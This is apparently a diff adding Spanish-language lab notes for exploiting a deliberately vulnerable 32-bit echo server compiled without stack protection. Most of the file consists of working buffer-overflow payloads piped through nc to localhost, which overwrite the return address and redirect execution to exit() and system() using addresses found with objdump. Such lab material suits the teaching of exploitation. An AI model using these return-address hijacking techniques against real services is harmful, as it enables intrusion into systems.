@@ -1,0 +1,38 @@
+gcc -ggdb -m32 -fno-stack-protector -fno-pie -no-pie echo.c -o echo
+setarch x86_64 -R ./echo 9000
+setarch x86_64 -R gdb ./echo
+
+fallo:
+podemos recibir hasta 1024bytes y ponerlos en un buffer de 32 bytes (buffer overflow)
+
+crash con:
+python3 -c "print('A' * 44)" | nc localhost 9000
+
+valor 0x44444444 en la dirección de retorno:
+python3 -c "print('A' * 44+'D'*4)" | nc localhost 9000
+
+exit():
+objdump -d echo |grep exit
+080490c0 <exit@plt>:
+ 80492eb:	e8 d0 fd ff ff       	call   80490c0 <exit@plt>
+ 804932a:	e8 91 fd ff ff       	call   80490c0 <exit@plt>
+ 80493e5:	e8 d6 fc ff ff       	call   80490c0 <exit@plt>
+ 804941c:	e8 9f fc ff ff       	call   80490c0 <exit@plt>
+
+
+llamar a exit():
+python3 -c "import sys;sys.stdout.buffer.write(b'A'*44 + b'\x1c\x94\x04\x08');" | nc localhost 9000
+
+system():
+objdump -d echo |grep system
+080490b0 <system@plt>:
+ 8049429:	e8 82 fc ff ff       	call   80490b0 <system@plt>
+
+llamar a system():
+python3 -c "import sys;sys.stdout.buffer.write(b'A'*44 + b'\x29\x94\x04\x08');" | nc localhost 9000
+
+
+paso6:
+python3 exploit.py | nc localhost 9000
+
+display/20xw $sp
